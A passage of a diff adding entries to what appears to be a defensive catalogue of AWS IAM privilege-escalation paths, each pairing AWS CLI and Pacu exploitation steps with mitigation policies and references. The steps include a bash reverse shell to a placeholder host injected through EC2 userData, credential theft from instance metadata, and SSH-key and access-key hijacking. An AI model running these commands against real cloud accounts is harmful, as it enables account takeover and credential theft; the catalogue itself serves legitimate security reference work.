+          "command": "aws datapipeline put-pipeline-definition --pipeline-id PIPELINE_ID \\\n  --pipeline-definition file://malicious-pipeline.json\n",
+          "description": "Define a pipeline that runs arbitrary shell commands with the privileged role"
+        },
+        {
+          "step": 3,
+          "command": "aws datapipeline activate-pipeline --pipeline-id PIPELINE_ID",
+          "description": "Activate the pipeline to execute the malicious code"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificDataPipelineRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": [\"datapipeline.amazonaws.com\", \"elasticmapreduce.amazonaws.com\"]\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict Data Pipeline permissions to specific users\n- Monitor CloudTrail for Data Pipeline creation and activation\n- Require pipeline definitions to be stored in approved repositories\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - DataPipeline PassRole",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "ec2-001",
+      "lambda-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "datapipeline:CreatePipeline",
+          "resourceConstraints": "Must have permission to create Data Pipeline pipelines"
+        },
+        {
+          "permission": "datapipeline:PutPipelineDefinition",
+          "resourceConstraints": "Must have permission to define pipeline activities"
+        },
+        {
+          "permission": "datapipeline:ActivatePipeline",
+          "resourceConstraints": "Must have permission to activate pipelines"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "ec2-001",
+    "name": "iam:PassRole + ec2:RunInstances",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "ec2"
+    ],
+    "description": "A principal with `iam:PassRole` and `ec2:RunInstances` permissions can launch a new EC2 instance and attach an existing IAM Role to it. By accessing this new instance (e.g., via User Data or SSM), the attacker can obtain the credentials of the passed role. The level of access gained depends on the permissions of the available roles.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts ec2.amazonaws.com to assume it",
+        "The role must have an instance profile associated with it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A role must exist that trusts ec2.amazonaws.com to assume it",
+        "The role must have an instance profile associated with it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Arn=\"arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE\" --user-data file://exploit.sh",
+          "description": "Launch EC2 instance with privileged role and user data script to exfiltrate credentials"
+        },
+        {
+          "step": 2,
+          "command": "# User data script executes on boot and sends credentials to attacker-controlled server",
+          "description": "Retrieve the temporary credentials from the attacker's server"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run ec2__startup_shell_script --instance-profile PRIVILEGED_ROLE --script exploit.sh",
+          "description": "Use Pacu to launch EC2 instance with the target role and execute a shell script on startup"
+        }
+      ]
+    },
+    "recommendation": "- Tightly control the `iam:PassRole` permission using the principle of least privilege.\n- Use IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"`iam:PassRole`\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"`iam:PassedToService`\": \"ec2.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for suspicious PassRole + RunInstances patterns, especially:\n  - PassRole events followed immediately by RunInstances\n  - Roles being passed to EC2 that haven't been used before\n  - EC2 instances launched with privileged roles by unusual principals\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - CreateEC2WithExistingIP",
+        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc3-CreateEC2WithExistingIP.tf"
+      }
+    ],
+    "relatedPaths": [
+      "lambda-001",
+      "cloudformation-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "ec2:RunInstances",
+          "resourceConstraints": "Must have permission to launch EC2 instances"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "ec2-002",
+    "name": "ec2:ModifyInstanceAttribute + ec2:StopInstances + ec2:StartInstances",
+    "category": "access-resource",
+    "services": [
+      "ec2"
+    ],
+    "description": "An attacker with the permissions to modify an EC2 instance's attributes, stop it, and start it can gain full control over the instance. The `ec2:ModifyInstanceAttribute` permission can be used to change an instance's userData, which is a script that normally runs on the initial boot. However with a specially crafted payload, a modified userData script can be coerced to run on subsequent restarts. To modify the userData of a running instance, it must first be stopped. The attacker can inject a malicious script (e.g., for a reverse shell) into the userData, and then start the instance to trigger its execution. This provides the attacker with code execution on the machine, allowing them to steal the credentials of any attached IAM role.",
+    "prerequisites": {
+      "admin": [
+        "EC2 instance must have an instance profile attached to an IAM role",
+        "Target EC2 instance must have a role with administrative permissions attached"
+      ],
+      "lateral": [
+        "EC2 instance must have an instance profile attached to an IAM role"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "# Create malicious user data with cloud-init configuration\nTEXT='Content-Type: multipart/mixed; boundary=\"//\"\nMIME-Version: 1.0\n\n--//\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"cloud-config.txt\"\n\n#cloud-config\ncloud_final_modules:\n- [scripts-user, always]\n\n--//\nContent-Type: text/x-shellscript; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"userdata.txt\"\n\n#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\n--//'\nTEXT_PATH=\"/tmp/text.b64.txt\"\nprintf \"%s\" \"$TEXT\" | base64 > \"$TEXT_PATH\"\n",
+          "description": "Create base64-encoded malicious user data with reverse shell payload"
+        },
+        {
+          "step": 2,
+          "command": "aws ec2 stop-instances --instance-ids $INSTANCE_ID",
+          "description": "Stop the target EC2 instance"
+        },
+        {
+          "step": 3,
+          "command": "aws ec2 modify-instance-attribute --instance-id \"$INSTANCE_ID\" --attribute userData --value \"file://$TEXT_PATH\"",
+          "description": "Modify the user data with the malicious script"
+        },
+        {
+          "step": 4,
+          "command": "aws ec2 start-instances --instance-ids $INSTANCE_ID",
+          "description": "Start the instance to trigger execution of the malicious user data"
+        }
+      ]
+    },
+    "recommendation": "The combination of `ec2:ModifyInstanceAttribute`, `ec2:StopInstances`, and `ec2:StartInstances`\nis highly sensitive. IAM policies should avoid granting these permissions together,\nespecially with wildcard resources. If necessary, use the Resource element in IAM policies\nto strictly limit these actions to a specific, intended set of instances. Monitor CloudTrail\nlogs for this sequence of API calls.\n",
+    "discoveredBy": {
+      "name": "Unknown",
+      "organization": "Unknown"
+    },
+    "references": [
+      {
+        "title": "Bishop Fox Blog - Privilege Escalation in AWS",
+        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "ec2:ModifyInstanceAttribute",
+          "resourceConstraints": "Target EC2 instance must be in the Resource section"
+        },
+        {
+          "permission": "ec2:StopInstances",
+          "resourceConstraints": "Target EC2 instance must be in the Resource section"
+        },
+        {
+          "permission": "ec2:StartInstances",
+          "resourceConstraints": "Target EC2 instance must be in the Resource section"
+        }
+      ]
+    }
+  },
+  {
+    "id": "ec2-003",
+    "name": "ec2-instance-connect:SendSSHPublicKey",
+    "category": "access-resource",
+    "services": [
+      "ec2",
+      "ec2-instance-connect"
+    ],
+    "description": "A principal with `ec2-instance-connect:SendSSHPublicKey` can push a temporary SSH public key to an EC2 instance and establish an SSH connection. If the target EC2 instance has a privileged IAM role attached via an instance profile, the attacker can SSH into the instance and access the instance metadata service (IMDS) to retrieve temporary credentials for that role. This provides the attacker with the full permissions of the instance's IAM role.",
+    "prerequisites": {
+      "admin": [
+        "An EC2 instance must exist with EC2 Instance Connect enabled (Amazon Linux 2 or Ubuntu 16.04+)",
+        "The instance must have an IAM role with administrative permissions attached",
+        "The instance must be running",
+        "Network access must allow SSH (port 22) to the instance"
+      ],
+      "lateral": [
+        "An EC2 instance must exist with EC2 Instance Connect enabled (Amazon Linux 2 or Ubuntu 16.04+)",
+        "The instance must have an IAM role attached",
+        "The instance must be running",
+        "Network access must allow SSH (port 22) to the instance"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws ec2 describe-instances --filters \"Name=instance-state-name,Values=running\"",
+          "description": "List running EC2 instances to find targets with privileged roles"
+        },
+        {
+          "step": 2,
+          "command": "aws iam get-instance-profile --instance-profile-name INSTANCE_PROFILE_NAME",
+          "description": "Check the instance profile to determine the attached role's permissions"
+        },
+        {
+          "step": 3,
+          "command": "ssh-keygen -t rsa -f /tmp/temp_key -N \"\"\n",
+          "description": "Generate a temporary SSH key pair"
+        },
+        {
+          "step": 4,
+          "command": "aws ec2-instance-connect send-ssh-public-key \\\n  --instance-id i-1234567890abcdef0 \\\n  --instance-os-user ec2-user \\\n  --ssh-public-key file:///tmp/temp_key.pub\n",
+          "description": "Push the temporary public key to the target instance (valid for 60 seconds)"
+        },
+        {
+          "step": 5,
+          "command": "ssh -i /tmp/temp_key ec2-user@INSTANCE_PUBLIC_IP\n",
+          "description": "SSH into the instance using the temporary key (must connect within 60 seconds)"
+        },
+        {
+          "step": 6,
+          "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n",
+          "description": "From the SSH session, retrieve temporary credentials from IMDS"
+        },
+        {
+          "step": 7,
+          "command": "export AWS_ACCESS_KEY_ID=<from step 6>\nexport AWS_SECRET_ACCESS_KEY=<from step 6>\nexport AWS_SESSION_TOKEN=<from step 6>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to assume the instance role's privileges"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `ec2-instance-connect:SendSSHPublicKey` permission using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"ec2-instance-connect:SendSSHPublicKey\",\n  \"Resource\": \"arn:aws:ec2:REGION:ACCOUNT_ID:instance/i-specificinstance\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"ec2:osuser\": \"ec2-user\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Use security groups to restrict SSH access to known IP ranges\n- Monitor CloudTrail for `SendSSHPublicKey` events, especially to instances with privileged roles\n- Implement IMDSv2 (session-oriented) to make credential theft more difficult\n- Use AWS Systems Manager Session Manager instead of SSH for remote access\n- Alert on unusual SSH connections to sensitive instances\n- Consider disabling EC2 Instance Connect on instances with privileged roles\n- Use VPC endpoints to restrict IMDS access\n",
+    "discoveredBy": {
+      "name": "Unknown",
+      "organization": "Unknown",
+      "date": ""
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - EC2 Instance Connect",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      },
+      {
+        "title": "AWS EC2 Instance Connect Documentation",
+        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html"
+      }
+    ],
+    "relatedPaths": [
+      "ec2-001",
+      "ec2-002",
+      "ssm-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "ec2-instance-connect:SendSSHPublicKey",
+          "resourceConstraints": "Target EC2 instance must be in the Resource section"
+        },
+        {
+          "permission": "ec2:DescribeInstances",
+          "resourceConstraints": "None - typically required to discover instance details"
+        }
+      ]
+    }
+  },
+  {
+    "id": "glue-001",
+    "name": "iam:PassRole + glue:CreateDevEndpoint",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "glue"
+    ],
+    "description": "A principal with `iam:PassRole` and `glue:CreateDevEndpoint` can create a new Glue development endpoint and attach an existing IAM role to it. Glue dev endpoints provide SSH/Zeppelin notebook access where arbitrary code can be executed with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts glue.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A role must exist that trusts glue.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws glue create-dev-endpoint --endpoint-name privesc-endpoint \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --public-key \"$(cat ~/.ssh/id_rsa.pub)\"\n",
+          "description": "Create a Glue development endpoint with the privileged role and your SSH public key"
+        },
+        {
+          "step": 2,
+          "command": "aws glue get-dev-endpoint --endpoint-name privesc-endpoint",
+          "description": "Wait for the endpoint to become available and retrieve connection details"
+        },
+        {
+          "step": 3,
+          "command": "ssh glue@ENDPOINT_ADDRESS",
+          "description": "SSH into the dev endpoint and execute code with elevated privileges"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificGlueRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `glue:CreateDevEndpoint` to authorized users only\n- Require dev endpoints to be created in private subnets with VPC endpoints\n- Monitor CloudTrail for Glue dev endpoint creation\n- Implement automated scanning for exposed dev endpoints\n",
+    "discoveredBy": {
+      "name": "Bishop Fox",
+      "organization": "Bishop Fox"
+    },
+    "references": [
+      {
+        "title": "Well, That Escalated Quickly: How Abusing AWS API Can Lead to Admin Access",
+        "url": "https://know.bishopfox.com/research/privilege-escalation-in-aws"
+      },
+      {
+        "title": "IAM Vulnerable - Glue CreateDevEndpoint",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "glue-002",
+      "ec2-001",
+      "lambda-001"
+    ],
+    "toolSupport": {
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "glue:CreateDevEndpoint",
+          "resourceConstraints": "Must have permission to create Glue development endpoints"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "glue-002",
+    "name": "glue:UpdateDevEndpoint",
+    "category": "access-resource",
+    "services": [
+      "glue"
+    ],
+    "description": "A principal with `glue:UpdateDevEndpoint` can update an existing Glue development endpoint to add their SSH public key, granting them SSH access to the endpoint. Since the endpoint executes with the permissions of its attached IAM role, the attacker gains the privileges of that role. This path doesn't require `iam:PassRole` as the role is already attached.",
+    "prerequisites": {
+      "admin": [
+        "A Glue development endpoint must already exist",
+        "The endpoint's attached role must have administrative permissions"
+      ],
+      "lateral": [
+        "A Glue development endpoint must already exist"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws glue get-dev-endpoints",
+          "description": "List existing Glue development endpoints and their attached roles"
+        },
+        {
+          "step": 2,
+          "command": "aws glue update-dev-endpoint --endpoint-name TARGET_ENDPOINT \\\n  --add-public-keys \"$(cat ~/.ssh/id_rsa.pub)\"\n",
+          "description": "Add your SSH public key to an existing privileged dev endpoint"
+        },
+        {
+          "step": 3,
+          "command": "aws glue get-dev-endpoint --endpoint-name TARGET_ENDPOINT",
+          "description": "Retrieve the endpoint address"
+        },
+        {
+          "step": 4,
+          "command": "ssh glue@ENDPOINT_ADDRESS",
+          "description": "SSH into the dev endpoint and execute code with the endpoint's role permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `glue:UpdateDevEndpoint` using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"glue:UpdateDevEndpoint\",\n  \"Resource\": \"arn:aws:glue:REGION:ACCOUNT_ID:devEndpoint/SpecificEndpoint\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for UpdateDevEndpoint API calls\n- Alert on public key additions to dev endpoints\n- Regularly audit dev endpoint SSH keys\n- Implement automated remediation for unauthorized key additions\n- Consider using session-based access instead of SSH keys\n",
+    "discoveredBy": {
+      "name": "Bishop Fox",
+      "organization": "Bishop Fox"
+    },
+    "references": [
+      {
+        "title": "Well, That Escalated Quickly: How Abusing AWS API Can Lead to Admin Access",
+        "url": "https://know.bishopfox.com/research/privilege-escalation-in-aws"
+      },
+      {
+        "title": "IAM Vulnerable - Glue UpdateDevEndpoint",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "glue-001",
+      "ssm-001",
+      "ec2-002"
+    ],
+    "toolSupport": {
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "glue:UpdateDevEndpoint",
+          "resourceConstraints": "Target dev endpoint must be in the Resource section"
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-001",
+    "name": "iam:CreatePolicyVersion",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:CreatePolicyVersion` can create a new version of an IAM policy. If a user can create a new version of a policy that is already attached to them, they can grant themselves administrative privileges by creating a new policy version with elevated permissions and setting it as the default version. A principal can also leverage this to escalate the permissions of another principal they can access.",
+    "prerequisites": [
+      {
+        "condition": "Policy must already be attached to the actor's user, role, or group",
+        "type": "resource-state"
+      }
+    ],
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam create-policy-version --policy-arn @arn --policy-document file://admin_policy.json --set-as-default",
+          "description": "Create a new policy version with administrative permissions and set it as default"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run iam__privesc_scan",
+          "description": "Scan for IAM privilege escalation opportunities including CreatePolicyVersion"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:CreatePolicyVersion` using the principle of least privilege.\nVery few principals need this permission, so it should be restricted to only the\nfew principals that need it. Monitor use of this sensitive permission using\nCloudSIEM detections, and look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-007",
+      "iam-008"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:CreatePolicyVersion",
+          "resourceConstraints": "Policy ARN must be in the Resource section and policy must be attached to the actor"
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-002",
+    "name": "iam:CreateAccessKey",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:CreateAccessKey` can create access keys for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.",
+    "prerequisites": {
+      "admin": [
+        "Target user must have fewer than 2 access keys already",
+        "Target user must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "Target user must have fewer than 2 access keys already"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam create-access-key --user-name @username",
+          "description": "Create a new access key for the target user"
+        },
+        {
+          "step": 2,
+          "command": "aws configure --profile target-user",
+          "description": "Configure AWS CLI with the newly created access key"
+        },
+        {
+          "step": 3,
+          "command": "aws sts get-caller-identity --profile target-user",
+          "description": "Verify access as the target user"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run iam__enum_users_roles_policies_groups",
+          "description": "Enumerate IAM users to find target with fewer than 2 keys"
+        },
+        {
+          "step": 2,
+          "command": "run iam__create_access_key --user-name @username",
+          "description": "Create access key for target user and automatically configure profile"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:CreateAccessKey` using the principle of least privilege. Only allow\nusers to create access keys for themselves or users they are authorized to manage. Very few\nprincipals need this permission on anyone other than themselves, so it should be restricted\nto only the few principals that need it.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-003",
+      "iam-004",
+      "iam-006"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:CreateAccessKey",
+          "resourceConstraints": "Target IAM user must be in the Resource section"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering target users"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for viewing user details"
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-003",
+    "name": "iam:CreateAccessKey + iam:DeleteAccessKey",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "description": "This is a variation of `iam:CreateAccessKey` that works even when the target user already has 2 access keys (the AWS maximum). By combining `iam:CreateAccessKey` with `iam:DeleteAccessKey`, an attacker can first delete one of the existing keys, then create a new access key for themselves, gaining access to the target user's permissions.",
+    "prerequisites": {
+      "admin": [
+        "Target user has 2 access keys (maximum allowed)",
+        "Target user must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "Target user has 2 access keys (maximum allowed)"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam list-access-keys --user-name @username",
+          "description": "List existing access keys for the target user"
+        },
+        {
+          "step": 2,
+          "command": "aws iam delete-access-key --user-name @username --access-key-id @access-key-id",
+          "description": "Delete one of the existing access keys"
+        },
+        {
+          "step": 3,
+          "command": "aws iam create-access-key --user-name @username",
+          "description": "Create a new access key for the target user"
+        },
+        {
+          "step": 4,
+          "command": "aws configure --profile target-user",
+          "description": "Configure AWS CLI with the newly created access key"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run iam__create_access_key --user-name @username --delete-existing",
+          "description": "Use Pacu to automatically delete an existing key and create a new one"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to both `iam:CreateAccessKey` and `iam:DeleteAccessKey` using the principle\nof least privilege. The combination of these permissions is particularly dangerous as it\nbypasses the 2-key limit protection. Monitor for sequences where DeleteAccessKey is\nimmediately followed by CreateAccessKey for the same user.\n",
+    "discoveredBy": {
+      "name": "Seth Art",
+      "organization": "Datadog",
+      "date": "2024"
+    },
+    "references": [
+      {
+        "title": "AWS IAM User Access Key Limits",
+        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-quotas.html"
+      }
+    ],
+    "relatedPaths": [
+      "iam-002"
+    ],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:CreateAccessKey",
+          "resourceConstraints": "Target IAM user must be in the Resource section"
+        },
+        {
+          "permission": "iam:DeleteAccessKey",
+          "resourceConstraints": "Target IAM user must be in the Resource section"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering target users"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for viewing user details"
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-004",
+    "name": "iam:CreateLoginProfile",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:CreateLoginProfile` can create console login profiles for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal via the AWS Console.",
+    "prerequisites": {
+      "admin": [
+        "Target user must NOT currently have a login profile",
+        "Target user must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "Target user must NOT currently have a login profile"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam create-login-profile --user-name @username --password @password",
+          "description": "Create a console login profile with a known password for the target user"
+        },
+        {
+          "step": 2,
+          "command": "# Login to AWS Console with the username and password",
+          "description": "Access AWS Console as the target user"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:CreateLoginProfile` using the principle of least privilege. Only allow\nusers to create login profiles for users they are authorized to manage. Very few principals\nneed this permission on anyone other than themselves, so it should be restricted to only the\nfew principals that need it. Monitor use of this sensitive permission using CloudSIEM\ndetections, and look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-002",
+      "iam-006"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:CreateLoginProfile",
+          "resourceConstraints": "Target IAM user must be in the Resource section"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering target users"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for viewing user details"
+        }
+      ]
+    }
+  },
+  {
+    "id": "iam-005",
+    "name": "iam:PutRolePolicy",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "description": "Anyone with access to `iam:PutRolePolicy` can attach inline policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
+    "prerequisites": [
+      "Principal must be a role (not a user)"
+    ],
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam put-role-policy --role-name @rolename --policy-name @policyname --policy-document file://escalation_policy.json",
+          "description": "Attach an inline policy with elevated permissions to the target role"
+        },
+        {
+          "step": 2,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the new permissions are active (for self-escalation)"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:PutRolePolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "iam-007",
+      "iam-009",
+      "iam-011"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PutRolePolicy",
+          "resourceConstraints": "Target role must be in the Resource section. For self-escalation, must have permission on own role."
+        }
+      ]
